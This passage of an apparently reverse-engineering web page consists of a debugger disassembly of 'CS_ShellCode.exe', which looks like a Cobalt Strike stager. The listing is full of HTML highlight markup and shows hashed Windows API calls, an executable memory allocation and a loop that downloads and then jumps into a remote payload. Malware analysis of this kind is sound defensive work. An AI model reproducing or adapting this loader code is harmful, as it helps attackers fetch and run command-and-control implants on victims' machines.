<span class="number">74</span> <span class="number">69</span>                       <span class="operator">|</span> je cs_shellcode.D44274                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4420B                                         <span class="operator">|</span> <span class="number">626</span>C65 <span class="number">3</span>B                   <span class="operator">|</span> bound ebp,qword ptr ss:[ebp<span class="operator">+</span><span class="number">3</span>B]                 <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4420F                                         <span class="operator">|</span> <span class="number">204</span>D <span class="number">53</span>                     <span class="operator">|</span> <span class="keyword">and</span> byte ptr ss:[ebp<span class="operator">+</span><span class="number">53</span>],cl                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44212                                         <span class="operator">|</span> <span class="number">49</span>                          <span class="operator">|</span> <span class="type">dec</span> ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44213                                         <span class="operator">|</span> <span class="number">45</span>                          <span class="operator">|</span> inc ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44214                                         <span class="operator">|</span> <span class="number">2039</span>                        <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[ecx],bh                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44216                                         <span class="operator">|</span> <span class="number">2</span>E:<span class="number">303</span>B                     <span class="operator">|</span> xor byte ptr cs:[ebx],bh                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44219                                         <span class="operator">|</span> <span class="number">2057</span> <span class="number">69</span>                     <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[edi<span class="operator">+</span><span class="number">69</span>],dl                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4421C                                         <span class="operator">|</span> <span class="number">6</span>E                          <span class="operator">|</span> outsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4421D                                         <span class="operator">|</span> <span class="number">64</span>:<span class="number">6</span>F                       <span class="operator">|</span> outsd                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4421F                                         <span class="operator">|</span> <span class="number">77</span> <span class="number">73</span>                       <span class="operator">|</span> ja cs_shellcode.D44294                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44221                                         <span class="operator">|</span> <span class="number">204</span>E <span class="number">54</span>                     <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[esi<span class="operator">+</span><span class="number">54</span>],cl                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44224                                         <span class="operator">|</span> <span class="number">2036</span>                        <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[esi],dh                        <span class="operator">|</span> byte ptr ds:[esi]:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44226                                         <span class="operator">|</span> <span class="number">2</span>E:<span class="number">313</span>B                     <span class="operator">|</span> xor dword ptr cs:[ebx],edi                      <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44229                                         <span class="operator">|</span> <span class="number">2057</span> <span class="number">4</span>F                     <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[edi<span class="operator">+</span><span class="number">4</span>F],dl                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4422C                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D4422D                                         <span class="operator">|</span> <span class="number">36</span>:<span class="number">34</span> <span class="number">3</span>B                    <span class="operator">|</span> xor al,<span class="number">3</span>B                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44230                                         <span class="operator">|</span> <span class="number">205472</span> <span class="number">69</span>                   <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[edx<span class="operator">+</span>esi<span class="operator">*</span><span class="number">2</span><span class="operator">+</span><span class="number">69</span>],dl               <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44234                                         <span class="operator">|</span> <span class="number">6465</span>:<span class="number">6</span>E                     <span class="operator">|</span> outsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44237                                         <span class="operator">|</span> <span class="number">74</span> <span class="number">2</span>F                       <span class="operator">|</span> je cs_shellcode.D44268                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44239                                         <span class="operator">|</span> <span class="number">35</span> <span class="number">2E303</span>B20                 <span class="operator">|</span> xor eax,<span class="number">203</span>B302E                                <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4423E                                         <span class="operator">|</span> <span class="number">4</span>D                          <span class="operator">|</span> <span class="type">dec</span> ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4423F                                         <span class="operator">|</span> <span class="number">41</span>                          <span class="operator">|</span> inc ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44240                                         <span class="operator">|</span> <span class="number">54</span>                          <span class="operator">|</span> push esp                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44241                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44242                                         <span class="operator">|</span> <span class="number">3</span>B20                        <span class="operator">|</span> cmp esp,dword ptr ds:[eax]                      <span class="operator">|</span> dword ptr ds:[eax]:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44244                                         <span class="operator">|</span> <span class="number">4</span>D                          <span class="operator">|</span> <span class="type">dec</span> ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44245                                         <span class="operator">|</span> <span class="number">41</span>                          <span class="operator">|</span> inc ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44246                                         <span class="operator">|</span> <span class="number">54</span>                          <span class="operator">|</span> push esp                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44247                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44248                                         <span class="operator">|</span> <span class="number">290</span>D <span class="number">0</span>A00E4DD               <span class="operator">|</span> sub dword ptr ds:[DDE4000A],ecx                 <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4424E                                         <span class="operator">|</span> <span class="number">30</span>AF <span class="number">8610</span>A009               <span class="operator">|</span> xor byte ptr ds:[edi<span class="operator">+</span><span class="number">9</span>A01086],ch                <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44254                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">0</span>F28C040                 <span class="operator">|</span> push <span class="number">40</span>C0280F                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44259                                         <span class="operator">|</span> B9 F5659D39                 <span class="operator">|</span> mov ecx,<span class="number">399</span>D65F5                                <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4425E                                         <span class="operator">|</span> <span class="number">34</span> <span class="number">4</span>D                       <span class="operator">|</span> xor al,<span class="number">4</span>D                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44260                                         <span class="operator">|</span> F672 <span class="number">09</span>                     <span class="operator">|</span> div byte ptr ds:[edx<span class="operator">+</span><span class="number">9</span>]                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44263                                         <span class="operator">|</span> <span class="number">805441</span> E8 <span class="number">0</span>D                <span class="operator">|</span> adc byte ptr ds:[ecx<span class="operator">+</span>eax<span class="operator">*</span><span class="number">2</span><span class="number">-18</span>],D                <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44268                                         <span class="operator">|</span> <span class="number">891408</span>                      <span class="operator">|</span> mov dword ptr ds:[eax<span class="operator">+</span>ecx],edx                  <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span>ecx<span class="operator">*</span><span class="number">1</span>]:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4426B                                         <span class="operator">|</span> <span class="number">0</span>E                          <span class="operator">|</span> push cs                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4426C                                         <span class="operator">|</span> F9                          <span class="operator">|</span> stc                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4426D                                         <span class="operator">|</span> <span class="number">3</span>F                          <span class="operator">|</span> aas                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4426E                                         <span class="operator">|</span> <span class="number">08</span>A3 <span class="number">2</span>ED95668               <span class="operator">|</span> <span class="keyword">or</span> byte ptr ds:[ebx<span class="operator">+</span><span class="number">6856</span>D92E],ah                <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44274                                         <span class="operator">|</span> <span class="number">1</span>B8B <span class="number">7</span>A1FDAB3               <span class="operator">|</span> sbb ecx,dword ptr ds:[ebx<span class="number">-4</span>C25E086]             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4427A                                         <span class="operator">|</span> <span class="number">65</span>:<span class="number">016</span>E <span class="number">62</span>                  <span class="operator">|</span> <span class="keyword">add</span> dword ptr gs:[esi<span class="operator">+</span><span class="number">62</span>],ebp                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4427E                                         <span class="operator">|</span> <span class="number">3</span>A4C11 B8                   <span class="operator">|</span> cmp cl,byte ptr ds:[ecx<span class="operator">+</span>edx<span class="number">-48</span>]                 <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44282                                         <span class="operator">|</span> EC                          <span class="operator">|</span> <span class="keyword">in</span> al,dx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44283                                         <span class="operator">|</span> <span class="number">116</span>CEF <span class="number">90</span>                   <span class="operator">|</span> adc dword ptr ds:[edi<span class="operator">+</span>ebp<span class="operator">*</span><span class="number">8</span><span class="number">-70</span>],ebp             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44287                                         <span class="operator">|</span> A4                          <span class="operator">|</span> movsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44288                                         <span class="operator">|</span> <span class="number">73</span> <span class="number">4</span>A                       <span class="operator">|</span> jae cs_shellcode.D442D4                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4428A                                         <span class="operator">|</span> CA C395                     <span class="operator">|</span> ret far <span class="number">95</span>C3                                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4428D                                         <span class="operator">|</span> <span class="number">88</span>F0                        <span class="operator">|</span> mov al,dh                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4428F                                         <span class="operator">|</span> <span class="number">210</span>E                        <span class="operator">|</span> <span class="keyword">and</span> dword ptr ds:[esi],ecx                      <span class="operator">|</span> [dword ptr ds:[esi]]:&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44291                                         <span class="operator">|</span> <span class="number">9</span>B                          <span class="operator">|</span> fwait                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44292                                         <span class="operator">|</span> <span class="number">5</span>A                          <span class="operator">|</span> pop edx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44293                                         <span class="operator">|</span> <span class="number">24</span> <span class="number">70</span>                       <span class="operator">|</span> <span class="keyword">and</span> al,<span class="number">70</span>                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44295                                         <span class="operator">|</span> <span class="number">64</span>:<span class="number">44</span>                       <span class="operator">|</span> inc esp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44297                                         <span class="operator">|</span> <span class="number">70</span> <span class="number">13</span>                       <span class="operator">|</span> jo cs_shellcode.D442AC                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44299                                         <span class="operator">|</span> <span class="number">01</span>F0                        <span class="operator">|</span> <span class="keyword">add</span> eax,esi                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf, esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4429B                                         <span class="operator">|</span> BC B9E0A0CB                 <span class="operator">|</span> mov esp,CBA0E0B9                                <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442A0                                         <span class="operator">|</span> C2 C9F5                     <span class="operator">|</span> ret F5C9                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442A3                                         <span class="operator">|</span> <span class="number">7</span>C BE                       <span class="operator">|</span> jl cs_shellcode.D44263                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442A5                                         <span class="operator">|</span> C8 <span class="number">9</span>AFD CA                  <span class="operator">|</span> enter FD9A,CA                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442A9                                         <span class="operator">|</span> <span class="number">6</span>A <span class="number">89</span>                       <span class="operator">|</span> push FFFFFF89                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442AB                                         <span class="operator">|</span> <span class="number">3</span>C <span class="number">6</span>E                       <span class="operator">|</span> cmp al,<span class="number">6</span>E                                       <span class="operator">|</span> <span class="number">6</span>E:<span class="string">&#x27;n&#x27;</span></span><br><span class="line"><span class="number">00</span>D442AD                                         <span class="operator">|</span> <span class="number">01</span>A0 <span class="number">21</span>F352B1               <span class="operator">|</span> <span class="keyword">add</span> dword ptr ds:[eax<span class="number">-4</span>EAD0CDF],esp             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442B3                                         <span class="operator">|</span> <span class="number">43</span>                          <span class="operator">|</span> inc ebx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442B4                                         <span class="operator">|</span> <span class="number">60</span>                          <span class="operator">|</span> pushad                                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442B5                                         <span class="operator">|</span> BA <span class="number">2</span>CC65531                 <span class="operator">|</span> mov edx,<span class="number">3155</span>C62C                                <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442BA                                         <span class="operator">|</span> <span class="number">72</span> <span class="number">0</span>D                       <span class="operator">|</span> jb cs_shellcode.D442C9                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442BC                                         <span class="operator">|</span> D30D <span class="number">0</span>A984EAE               <span class="operator">|</span> ror dword ptr ds:[AE4E980A],cl                  <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442C2                                         <span class="operator">|</span> A6                          <span class="operator">|</span> cmpsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442C3                                         <span class="operator">|</span> A3 <span class="number">523</span>C03A7                 <span class="operator">|</span> mov dword ptr ds:[A7033C52],eax                 <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D442C8                                         <span class="operator">|</span> <span class="number">36</span>:CB                       <span class="operator">|</span> ret far                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442CA                                         <span class="operator">|</span> <span class="number">68</span> D0E0912B                 <span class="operator">|</span> push <span class="number">2</span>B91E0D0                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442CF                                         <span class="operator">|</span> A5                          <span class="operator">|</span> movsd                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442D0                                         <span class="operator">|</span> B3 <span class="number">52</span>                       <span class="operator">|</span> mov bl,<span class="number">52</span>                                       <span class="operator">|</span> <span class="number">52</span>:<span class="string">&#x27;R&#x27;</span></span><br><span class="line"><span class="number">00</span>D442D2                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442D3                                         <span class="operator">|</span> DB                          <span class="operator">|</span> ???                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442D4                                         <span class="operator">|</span> A1 <span class="number">5</span>CF54FC0                 <span class="operator">|</span> mov eax,dword ptr ds:[C04FF55C]                 <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D442D9                                         <span class="operator">|</span> FC                          <span class="operator">|</span> cld                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442DA                                         <span class="operator">|</span> AD                          <span class="operator">|</span> lodsd                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442DB                                         <span class="operator">|</span> <span class="number">35</span> <span class="number">8091</span>B579                 <span class="operator">|</span> xor eax,<span class="number">79</span>B59180                                <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D442E0                                         <span class="operator">|</span> D4 <span class="number">0</span>E                       <span class="operator">|</span> aam E                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442E2                                         <span class="operator">|</span> CA <span class="number">4</span>A57                     <span class="operator">|</span> ret far <span class="number">574</span>A                                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442E5                                         <span class="operator">|</span> <span class="number">6</span>D                          <span class="operator">|</span> insd                                            <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442E6                                         <span class="operator">|</span> C6                          <span class="operator">|</span> ???                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442E7                                         <span class="operator">|</span> B5 <span class="number">89</span>                       <span class="operator">|</span> mov ch,<span class="number">89</span>                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442E9                                         <span class="operator">|</span> <span class="number">36</span>:<span class="number">8177</span> <span class="number">20</span> <span class="number">2</span>FB83A10         <span class="operator">|</span> xor dword ptr ss:[edi<span class="operator">+</span><span class="number">20</span>],<span class="number">103</span>AB82F              <span class="operator">|</span> [dword ptr ss:[edi<span class="operator">+</span><span class="number">20</span>]]:&quot;CommonProgramW6432=C:\\Program Files\\Common Files&quot;</span><br><span class="line"><span class="number">00</span>D442F1                                         <span class="operator">|</span> <span class="number">48</span>                          <span class="operator">|</span> <span class="type">dec</span> eax                                         <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D442F2                                         <span class="operator">|</span> <span class="number">41</span>                          <span class="operator">|</span> inc ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442F3                                         <span class="operator">|</span> FB                          <span class="operator">|</span> sti                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442F4                                         <span class="operator">|</span> <span class="number">88</span>C5                        <span class="operator">|</span> mov ch,al                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442F6                                         <span class="operator">|</span> <span class="number">17</span>                          <span class="operator">|</span> pop ss                                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442F7                                         <span class="operator">|</span> C50D <span class="number">5</span>FB177C0               <span class="operator">|</span> lds ecx,fword ptr ds:[C077B15F]                 <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442FD                                         <span class="operator">|</span> <span class="number">30</span>C7                        <span class="operator">|</span> xor bh,al                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D442FF                                         <span class="operator">|</span> <span class="number">6</span>E                          <span class="operator">|</span> outsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44300                                         <span class="operator">|</span> A1 <span class="number">4</span>FA11683                 <span class="operator">|</span> mov eax,dword ptr ds:[<span class="number">8316</span>A14F]                 <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44305                                         <span class="operator">|</span> <span class="number">5</span>D                          <span class="operator">|</span> pop ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44306                                         <span class="operator">|</span> <span class="number">36</span>:<span class="number">7</span>B F2                    <span class="operator">|</span> jnp cs_shellcode.D442FB                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44309                                         <span class="operator">|</span> <span class="number">5</span>A                          <span class="operator">|</span> pop edx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4430A                                         <span class="operator">|</span> F1                          <span class="operator">|</span> int1                                            <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4430B                                         <span class="operator">|</span> <span class="number">21E0</span>                        <span class="operator">|</span> <span class="keyword">and</span> eax,esp                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4430D                                         <span class="operator">|</span> <span class="number">882</span>B                        <span class="operator">|</span> mov byte ptr ds:[ebx],ch                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4430F                                         <span class="operator">|</span> F4                          <span class="operator">|</span> hlt                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44310                                         <span class="operator">|</span> <span class="number">47</span>                          <span class="operator">|</span> inc edi                                         <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44311                                         <span class="operator">|</span> FA                          <span class="operator">|</span> cli                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44312                                         <span class="operator">|</span> <span class="number">97</span>                          <span class="operator">|</span> xchg edi,eax                                    <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;, eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44313                                         <span class="operator">|</span> DB2E                        <span class="operator">|</span> fld tword ptr ds:[esi]                          <span class="operator">|</span> tbyte ptr ds:[esi]:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44315                                         <span class="operator">|</span> F8                          <span class="operator">|</span> clc                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44316                                         <span class="operator">|</span> <span class="number">12</span>F6                        <span class="operator">|</span> adc dh,dh                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44318                                         <span class="operator">|</span> D5 <span class="number">85</span>                       <span class="operator">|</span> aad <span class="number">85</span>                                          <span class="operator">|</span></span><br><span class="line">kernel32.ExitProcess</span><br><span class="line"><span class="number">00</span>D4431A                                         <span class="operator">|</span> <span class="number">0068</span> F0                     <span class="operator">|</span> <span class="keyword">add</span> byte ptr ds:[eax<span class="number">-10</span>],ch                     <span class="operator">|</span> byte ptr ds:[eax<span class="number">-10</span>]:___scrt_default_matherr</span><br><span class="line"><span class="number">00</span>D4431D                                         <span class="operator">|</span> B5 A2                       <span class="operator">|</span> mov ch,A2                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4431F                                         <span class="operator">|</span> <span class="number">56</span>                          <span class="operator">|</span> push esi                                        <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44320                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp</span><br><span class="line">kernel32.VitualAlloc                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44322                                         <span class="operator">|</span> <span class="number">6</span>A <span class="number">40</span>                       <span class="operator">|</span> push <span class="number">40</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44324                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">00100000</span>                 <span class="operator">|</span> push <span class="number">1000</span>                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44329                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">00004000</span>                 <span class="operator">|</span> push <span class="number">400000</span>                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4432E                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D4432F                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">58</span>A453E5                 <span class="operator">|</span> push E553A458                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44334                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44336                                         <span class="operator">|</span> <span class="number">93</span>                          <span class="operator">|</span> xchg ebx,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44337                                         <span class="operator">|</span> B9 <span class="number">00000000</span>                 <span class="operator">|</span> mov ecx,<span class="number">0</span>                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4433C                                         <span class="operator">|</span> <span class="number">01</span>D9                        <span class="operator">|</span> <span class="keyword">add</span> ecx,ebx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4433E                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4433F                                         <span class="operator">|</span> <span class="number">53</span>                          <span class="operator">|</span> push ebx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44340                                         <span class="operator">|</span> <span class="number">89E7</span>                        <span class="operator">|</span> mov edi,esp                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44342                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44343                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">00200000</span>                 <span class="operator">|</span> push <span class="number">2000</span>                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44348                                         <span class="operator">|</span> <span class="number">53</span>                          <span class="operator">|</span> push ebx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44349                                         <span class="operator">|</span> <span class="number">56</span>                          <span class="operator">|</span> push esi                                        <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4434A                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">129689E2</span>                 <span class="operator">|</span> push E2899612                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4434F                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44351                                         <span class="operator">|</span> <span class="number">85</span>C0                        <span class="operator">|</span> test eax,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44353                                         <span class="operator">|</span> <span class="number">74</span> C6                       <span class="operator">|</span> je cs_shellcode.D4431B                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44355                                         <span class="operator">|</span> <span class="number">8</span>B07                        <span class="operator">|</span> mov eax,dword ptr ds:[edi]                      <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf, [dword ptr ds:[edi]]:&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44357                                         <span class="operator">|</span> <span class="number">01</span>C3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,eax                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44359                                         <span class="operator">|</span> <span class="number">85</span>C0                        <span class="operator">|</span> test eax,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4435B                                         <span class="operator">|</span> <span class="number">75</span> E5                       <span class="operator">|</span> jne cs_shellcode.D44342                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4435D                                         <span class="operator">|</span> <span class="number">58</span>                          <span class="operator">|</span> pop eax                                         <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4435E                                         <span class="operator">|</span> C3                          <span class="operator">|</span> ret                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4435F                                         <span class="operator">|</span> E8 A9FDFFFF                 <span class="operator">|</span> <span class="keyword">call</span> cs_shellcode.D4410D                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44364                                         <span class="operator">|</span> <span class="number">3139</span>                        <span class="operator">|</span> xor dword ptr ds:[ecx],edi                      <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44366                                         <span class="operator">|</span> <span class="number">322</span>E                        <span class="operator">|</span> xor ch,byte ptr ds:[esi]                        <span class="operator">|</span> byte ptr ds:[esi]:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44368                                         <span class="operator">|</span> <span class="number">3136</span>                        <span class="operator">|</span> xor dword ptr ds:[esi],esi                      <span class="operator">|</span> [dword ptr ds:[esi]]:&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;, esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span 